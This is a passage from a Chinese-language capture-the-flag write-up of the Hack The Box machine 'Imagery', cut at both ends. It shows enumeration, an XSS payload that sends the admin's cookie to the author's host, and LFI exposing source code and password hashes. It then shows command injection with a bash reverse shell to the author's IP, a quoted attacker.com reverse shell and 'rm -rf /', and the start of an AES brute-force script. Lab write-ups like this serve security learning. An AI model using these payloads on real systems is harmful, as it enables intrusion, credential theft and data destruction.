 detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 11.59 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e枚举\u003c/h3\u003e\n\u003cp\u003e随意注册一个用户进行登录\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e登录进来后，看数据包，有我们登录的用户的数据\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e一开始以为是 \u003ccode\u003ejwt\u003c/code\u003e，但是貌似并不是\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eCookie: session=.eJyrVkrJLC7ISaz0TFGyUrIwNjFJNk4zUdJRyix2TMnNzFOySkvMKU4F8eMzcwtSi4rz8xJLMvPS40tSi0tKi1OLkFXAxOITk5PzS_NK4HIgwbzE3FSgHYYOhXrJ-blKtQBa_iuB.aN_W1Q.P8aflniN6fcK97nVc568grDIlT0\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e目录扫描，超级慢，直接不扫了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  imagery gobuster \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip -u http://10.10.11.88:8000\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) \u0026#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.11.88:8000\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e directory enumeration mode\n===============================================================\n/images               (Status: 401) [Size: 59]\n/login                (Status: 405) [Size: 153]\n/register             (Status: 405) [Size: 153]\n/logout               (Status: 405) [Size: 153]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e随意上传了一张图片，但是很多功能都无法使用，所以我们应该先要获取管理员权限\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e因为是 python 服务器，大概率也不是打图片马，还有一个 \u003ccode\u003eReport Bug\u003c/code\u003e 功能\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e随便提交一些东西，提示：\u003cstrong\u003e\u003ccode\u003eBug report submitted. Admin review in progress.\u003c/code\u003e\u003c/strong\u003e 表示管理员会对其进行审核，也就是使用着管理员的身份\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e不过首先还是测试一下是否存在 SQL 注入，手动和使用工具进行扫描一遍都没有扫描出来\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  imagery sqlmap -r packet --level 3 --risk 3 --batch\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003eXSS\u003c/h3\u003e\n\u003cp\u003e根据上边的提示：\u003cstrong\u003e\u003ccode\u003eBug report submitted. Admin review in progress.\u003c/code\u003e\u003c/strong\u003e 表示管理员会对其进行审核，也就是使用着管理员的身份\u003c/p\u003e\n\u003cp\u003e也就是我们提交 URL 或者 XSS 代码可能会触发到\u003c/p\u003e\n\u003cp\u003e首先输入一遍 URL，等待是否触发\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e并没有触发，尝试一下 XSS\u003c/p\u003e\n\u003cp\u003e经过测试后可以通过如下代码进行触发\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u0026#x3C;img src=\u003cspan class=\"hljs-string\"\u003e\"http://10.10.14.113:8080/log?cookie=\"\u003c/span\u003e + document.cookie\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e尝试获取一下 \u003ccode\u003ecookie\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e最后通过如下代码可以触发得到 \u003ccode\u003ecookie\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u0026#x3C;img src=x onerror=\u003cspan class=\"hljs-string\"\u003e\"this.src='http://10.10.14.113:8080/?'+document.cookie\"\u003c/span\u003e\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aN_lNA.JEUfB42pOi4xOGy9nt13xU-uCIY\n.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aOCUgw.7hoJx49e3QwScLnI0UYOoRH_x5Q\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e替换原本 \u003ccode\u003ecookie\u003c/code\u003e 后就能进入管理员面板（进入面板后疯狂跳其他 URL）\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003eLFI 利用\u003c/h3\u003e\n\u003cp\u003e后台貌似就多了一个功能 “\u003ccode\u003eDownload Log\u003c/code\u003e”\u003c/p\u003e\n\u003cp\u003e抓包后进行测试，存在 LFI\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e有两个有 shell 的用户，\u003ccode\u003emark\u003c/code\u003e 和 \u003ccode\u003eweb\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e枚举目录，\u003ccode\u003e/var\u003c/code\u003e 里面没测出来，尝试 \u003ccode\u003eweb\u003c/code\u003e 用户家目录\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image14.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e// app.py\nfrom flask import Flask, render_template\nimport os\nimport sys\nfrom datetime import datetime\nfrom config import *\nfrom utils import _load_data, _save_data\nfrom utils import *\nfrom api_auth import bp_auth\nfrom api_upload import bp_upload\nfrom api_manage import bp_manage\nfrom api_edit import bp_edit\nfrom api_admin import bp_admin\nfrom api_misc import bp_misc\n\napp_core = Flask(__name__)\napp_core.secret_key = os.urandom(24).hex()\napp_core.config[\u003cspan class=\"hljs-string\"\u003e'SESSION_COOKIE_HTTPONLY'\u003c/span\u003e] = False\n\napp_core.register_blueprint(bp_auth)\napp_core.register_blueprint(bp_upload)\napp_core.register_blueprint(bp_manage)\napp_core.register_blueprint(bp_edit)\napp_core.register_blueprint(bp_admin)\napp_core.register_blueprint(bp_misc)\n\n@app_core.route(\u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e)\ndef main_dashboard():\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e render_template(\u003cspan class=\"hljs-string\"\u003e'index.html'\u003c/span\u003e)\n\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e __name__ == \u003cspan class=\"hljs-string\"\u003e'__main__'\u003c/span\u003e:\n    current_database_data = _load_data()\n    default_collections = [\u003cspan class=\"hljs-string\"\u003e'My Images'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'Unsorted'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'Converted'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'Transformed'\u003c/span\u003e]\n    existing_collection_names_in_database = {g[\u003cspan class=\"hljs-string\"\u003e'name'\u003c/span\u003e] \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e g \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e current_database_data.get(\u003cspan class=\"hljs-string\"\u003e'image_collections'\u003c/span\u003e, [])}\n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e collection_to_add \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e default_collections:\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e collection_to_add not \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e existing_collection_names_in_database:\n            current_database_data.setdefault(\u003cspan class=\"hljs-string\"\u003e'image_collections'\u003c/span\u003e, []).append({\u003cspan class=\"hljs-string\"\u003e'name'\u003c/span\u003e: collection_to_add})\n    _save_data(current_database_data)\n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e user_entry \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e current_database_data.get(\u003cspan class=\"hljs-string\"\u003e'users'\u003c/span\u003e, []):\n        user_log_file_path = os.path.join(SYSTEM_LOG_FOLDER, f\u003cspan class=\"hljs-string\"\u003e\"{user_entry['username']}.log\"\u003c/span\u003e)\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e not os.path.exists(user_log_file_path):\n            with open(user_log_file_path, \u003cspan class=\"hljs-string\"\u003e'w'\u003c/span\u003e) as f:\n                f.write(f\u003cspan class=\"hljs-string\"\u003e\"[{datetime.now().isoformat()}] Log file created for {user_entry['username']}.\\n\"\u003c/span\u003e)\n    port = int(os.environ.get(\u003cspan class=\"hljs-string\"\u003e\"PORT\"\u003c/span\u003e, 8000))\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e port \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e BLOCKED_APP_PORTS:\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"Port {port} is blocked for security reasons. Please choose another port.\"\u003c/span\u003e)\n        sys.exit(1)\n    app_core.run(debug=False, host=\u003cspan class=\"hljs-string\"\u003e'0.0.0.0'\u003c/span\u003e, port=port)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e包含配置文件 \u003ccode\u003econfig.py\u003c/code\u003e ，还能得到一个新文件名 \u003ccode\u003edb.json\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image15.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e里面是用户的凭据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\t\t\t\t{\n            \u003cspan class=\"hljs-string\"\u003e\"username\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"admin@imagery.htb\"\u003c/span\u003e,\n            \u003cspan class=\"hljs-string\"\u003e\"password\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"5d9c1d507a3f76af1e5c97a3ad1eaa31\"\u003c/span\u003e,\n            \u003cspan class=\"hljs-string\"\u003e\"isAdmin\"\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n            \u003cspan class=\"hljs-string\"\u003e\"displayId\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"a1b2c3d4\"\u003c/span\u003e,\n            \u003cspan class=\"hljs-string\"\u003e\"login_attempts\"\u003c/span\u003e: 0,\n            \u003cspan class=\"hljs-string\"\u003e\"isTestuser\"\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\n            \u003cspan class=\"hljs-string\"\u003e\"failed_login_attempts\"\u003c/span\u003e: 0,\n            \u003cspan class=\"hljs-string\"\u003e\"locked_until\"\u003c/span\u003e: null\n        },\n        {\n            \u003cspan class=\"hljs-string\"\u003e\"username\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"testuser@imagery.htb\"\u003c/span\u003e,\n            \u003cspan class=\"hljs-string\"\u003e\"password\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"2c65c8d7bfbca32a3ed42596192384f6\"\u003c/span\u003e,\n            \u003cspan class=\"hljs-string\"\u003e\"isAdmin\"\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\n            \u003cspan class=\"hljs-string\"\u003e\"displayId\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"e5f6g7h8\"\u003c/span\u003e,\n            \u003cspan class=\"hljs-string\"\u003e\"login_attempts\"\u003c/span\u003e: 0,\n            \u003cspan class=\"hljs-string\"\u003e\"isTestuser\"\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n            \u003cspan class=\"hljs-string\"\u003e\"failed_login_attempts\"\u003c/span\u003e: 2,\n            \u003cspan class=\"hljs-string\"\u003e\"locked_until\"\u003c/span\u003e: null\n        },\n        {\n            \u003cspan class=\"hljs-string\"\u003e\"username\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"test@test.com\"\u003c/span\u003e,\n            \u003cspan class=\"hljs-string\"\u003e\"password\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"098f6bcd4621d373cade4e832627b4f6\"\u003c/span\u003e,\n            \u003cspan class=\"hljs-string\"\u003e\"displayId\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"5241c653\"\u003c/span\u003e,\n            \u003cspan class=\"hljs-string\"\u003e\"isAdmin\"\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\n            \u003cspan class=\"hljs-string\"\u003e\"failed_login_attempts\"\u003c/span\u003e: 0,\n            \u003cspan class=\"hljs-string\"\u003e\"locked_until\"\u003c/span\u003e: null,\n            \u003cspan class=\"hljs-string\"\u003e\"isTestuser\"\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n        },\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e其中 \u003ccode\u003etestuser\u003c/code\u003e 的密码可以解出来 \u003ccode\u003eiambatman\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image16.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e再审计一下其他文件，从 \u003ccode\u003eapp.py\u003c/code\u003e 中可以得到好几个文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003efrom api_auth import bp_auth\nfrom api_upload import bp_upload\nfrom api_manage import bp_manage\nfrom api_edit import bp_edit\nfrom api_admin import bp_admin\nfrom api_misc import bp_misc\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e读取并通过 AI 进行审计，最后在 \u003ccode\u003eapi_edit.py\u003c/code\u003e 审计到存在 \u003ccode\u003eRCE\u003c/code\u003e 漏洞\u003c/p\u003e\n\u003cp\u003e远程代码执行 (RCE) 漏洞 (Command Injection)\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e问题点\u003c/strong\u003e: \u003ccode\u003e/apply_visual_transform\u003c/code\u003e 端点中的 \u003ccode\u003ecrop\u003c/code\u003e 操作。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u0026#x3C;PYTHON\u003e\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e transform_type == \u003cspan class=\"hljs-string\"\u003e'crop'\u003c/span\u003e:\n    x = \u003cspan class=\"hljs-built_in\"\u003estr\u003c/span\u003e(params.get(\u003cspan class=\"hljs-string\"\u003e'x'\u003c/span\u003e))\n    y = \u003cspan class=\"hljs-built_in\"\u003estr\u003c/span\u003e(params.get(\u003cspan class=\"hljs-string\"\u003e'y'\u003c/span\u003e))\n    width = \u003cspan class=\"hljs-built_in\"\u003estr\u003c/span\u003e(params.get(\u003cspan class=\"hljs-string\"\u003e'width'\u003c/span\u003e))\n    height = \u003cspan class=\"hljs-built_in\"\u003estr\u003c/span\u003e(params.get(\u003cspan class=\"hljs-string\"\u003e'height'\u003c/span\u003e))\n\u003cspan class=\"hljs-comment\"\u003e# VULNERABLE LINE: f-string formatting with shell=True\u003c/span\u003e\n    command = \u003cspan class=\"hljs-string\"\u003ef\"\u003cspan class=\"hljs-subst\"\u003e{IMAGEMAGICK_CONVERT_PATH}\u003c/span\u003e \u003cspan class=\"hljs-subst\"\u003e{original_filepath}\u003c/span\u003e -crop \u003cspan class=\"hljs-subst\"\u003e{width}\u003c/span\u003ex\u003cspan class=\"hljs-subst\"\u003e{height}\u003c/span\u003e+\u003cspan class=\"hljs-subst\"\u003e{x}\u003c/span\u003e+\u003cspan class=\"hljs-subst\"\u003e{y}\u003c/span\u003e \u003cspan class=\"hljs-subst\"\u003e{output_filepath}\u003c/span\u003e\"\u003c/span\u003e\n    subprocess.run(command, capture_output=\u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e, text=\u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e, shell=\u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e, check=\u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e描述\u003c/strong\u003e: 这段代码存在一个教科书式的命令注入漏洞。\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e它使用 f-string 将用户直接提供的参数（\u003ccode\u003ewidth\u003c/code\u003e, \u003ccode\u003eheight\u003c/code\u003e, \u003ccode\u003ex\u003c/code\u003e, \u003ccode\u003ey\u003c/code\u003e）拼接到一个命令字符串中。\u003c/li\u003e\n\u003cli\u003e最致命的是，它使用了 \u003ccode\u003esubprocess.run\u003c/code\u003e 的 \u003ccode\u003eshell=True\u003c/code\u003e 参数。这会使操作系统 shell（如bash）来解释整个命令字符串。\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e攻击场景\u003c/strong\u003e: 攻击者可以构造一个恶意的 JSON payload，将 shell 命令注入到参数中。例如：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u0026#x3C;JSON\u003e\n{\n  \u003cspan class=\"hljs-string\"\u003e\"imageId\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"some-valid-id\"\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e\"transformType\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"crop\"\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e\"params\"\u003c/span\u003e: {\n    \u003cspan class=\"hljs-string\"\u003e\"width\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"100; id\"\u003c/span\u003e,// Injects the \u003cspan class=\"hljs-string\"\u003e'id'\u003c/span\u003e command\n    \u003cspan class=\"hljs-string\"\u003e\"height\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"100\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"x\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"10\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"y\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"10\"\u003c/span\u003e\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e服务器将执行的命令会变成：\n\u003ccode\u003econvert \u0026#x3C;input\u003e -crop 100; id x100+10+10 \u0026#x3C;output\u003e\u003c/code\u003e\nShell 会依次执行：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003econvert \u0026#x3C;input\u003e -crop 100\u003c/code\u003e (可能会失败)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eid\u003c/code\u003e (成功执行，返回服务器用户信息)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ex100+10+10 \u0026#x3C;output\u003e\u003c/code\u003e (可能会失败) 攻击者可以注入任何命令，如 \u003ccode\u003erm -rf /\u003c/code\u003e 来删除整个文件系统，或者 \u003ccode\u003ebash -c 'bash -i \u003e\u0026#x26; /dev/tcp/attacker.com/4444 0\u003e\u0026#x26;1'\u003c/code\u003e 来获取一个反向 shell，从而完全控制服务器。\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3\u003eRCE\u003c/h3\u003e\n\u003cp\u003e对上面的审计的结果进行测试\u003c/p\u003e\n\u003cp\u003e通过上面的到的用户进行登录\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image17.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e执行成功\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image18.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e进行反弹 \u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-string\"\u003e\"x\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"100; /bin/bash -c 'bash -i \u003e\u0026#x26; /dev/tcp/10.10.14.113/1234 0\u003e\u0026#x26;1';\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image19.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e权限提升\u003c/h2\u003e\n\u003ch3\u003ezip.zes 解密\u003c/h3\u003e\n\u003cp\u003e在  \u003ccode\u003e/backup\u003c/code\u003e 中找到一个压缩包，后缀是 \u003ccode\u003ezip.zes\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ebash-\u003cspan class=\"hljs-number\"\u003e5.2\u003c/span\u003e$ ls\nweb_20250806_120723.\u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e.aes\n\u003c/code\u003e\u003c/pre\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e.zip\u003c/code\u003e\u003c/strong\u003e: 文件的原始形态是一个 ZIP 压缩包。\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e.aes\u003c/code\u003e\u003c/strong\u003e: 这个 ZIP 包被使用了 \u003cstrong\u003eAES (Advanced Encryption Standard)\u003c/strong\u003e 算法进行了加密。\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e写一个脚本进行爆破，脚本调用 \u003ccode\u003eaescrypt\u003c/code\u003e ：\u003ca href=\"https://www.aescrypt.com/download/\"\u003ehttps://www.aescrypt.com/download/\u003c/a\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e#!/usr/bin/env python3\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e subprocess\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e argparse\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e os\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e sys\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e shutil\n\n\u003cspan class=\"hljs-keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"hljs-title function_\"\u003echeck_dependencies\u003c/span\u003e():\n    \u003cspan class=\"hljs-string\"\u003e\"\"\"检查 aescrypt 是否已安装并处于系统 PATH 中\"\"\"\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e shutil.which(\u003cspan class=\"hljs-string\"\u003e\"aescrypt\"\u003c/span\u003e):\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"[!] 错误: 'aescrypt' 命令未找到。\"\u003c/span\u003e, file=sys.stderr)\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"    请先安装 aescrypt 并确保它在您的系统 PATH 中。\"\u003c/span\u003e, file=sys.stderr)\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"    在 Debian/Ubuntu 上，可以运行: sudo apt-get install aescrypt\"\u003c/span\u003e, file=sys.stderr)\n        sys.exit(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e)\n\n\u003cspan class=\"hljs-keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"hljs-title function_\"\u003ecrack_aes_file\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eaes_file, dictionary_file\u003c/span\u003e):\n    \u003cspan class=\"hljs-string\"\u003e\"\"\"\n    使用字典攻击来解密 AES 文件。\n\n    :param aes_file: AES 加密文件的路径。\n    :param dictionary_file: 密码字典文件的路径。\n    \"\"\"\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e# 检查输入文件是否存在\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e os.path.exists(aes_file):\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003ef\"[!] 错误: 加密文件 '\u003cspan class=\"hljs-subst\"\u003e{aes_file}\u003c/span\u003e' 不存在。\"\u003c/span\u003e, file=sys.stderr)\n        sys.exit(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e)\n        \n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e os.path.exists(dictionary_file):\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003ef\"[!] 错误: 字典文件 '\u003cspan class=\"hljs-subst\"\u003e{dictionary_file}\u003c/span\u003e' 不存在。\"\u003c/span\u003e, file=sys.stderr)\n        sys.exit(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e)\n\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003ef\"[*] 开始破解文件: \u003cspan class=\"hljs-subst\"\u003e{aes_file}\u003c/span\u003e\"\u003c/span\u003e)\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003ef\"[*] 使用字典: \u003cspan class=\"hljs-subst\"\u003e{dictionary_file}\u003c/span\u003e\"\u003c/span\u003e)\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"-\"\u003c/span\u003e * \u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e)\n\n    \u003cspan class=\"hljs-comment\"\u003e# 打开字典文件\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003etry\u003c/span\u003e:\n        \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e(dictionary_file, \u003cspan class=\"hljs-string\"\u003e'r'\u003c/span\u003e, encoding=\u003cspan class=\"hljs-string\"\u003e'utf-8'\u003c/span\u003e, errors=\u003cspan class=\"hljs-string\"\u003e'ignore'\u003c/span\u003e) \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e f:\n            \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e line \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e f:\n                \u003cspan 